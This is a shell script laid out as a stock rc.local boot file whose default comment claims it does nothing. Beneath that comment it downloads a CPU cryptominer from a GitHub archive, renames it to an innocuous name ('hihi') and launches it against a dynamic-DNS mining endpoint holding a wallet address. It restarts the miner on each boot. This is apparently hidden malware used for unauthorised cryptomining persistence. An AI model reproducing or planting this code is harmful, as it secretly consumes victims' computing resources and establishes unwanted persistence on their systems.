#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/kaka ]; then
    if pgrep -x "hihi" > /dev/null
then
pkill hihi
echo " kill process"
./hihi -F http://ohmygodguru.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc

    
else

echo "Miner da install , chay thoi "
./hihi -F http://ohmygodguru.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc

     
fi
exit
fi

wget https://github.com/StupidmanTan/miner-cpu/raw/master/kaka.zip
unzip kaka.zip
mv aquaminer-0.4-linux-amd64 hihi
./hihi -F http://ohmygodguru.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
exit 0
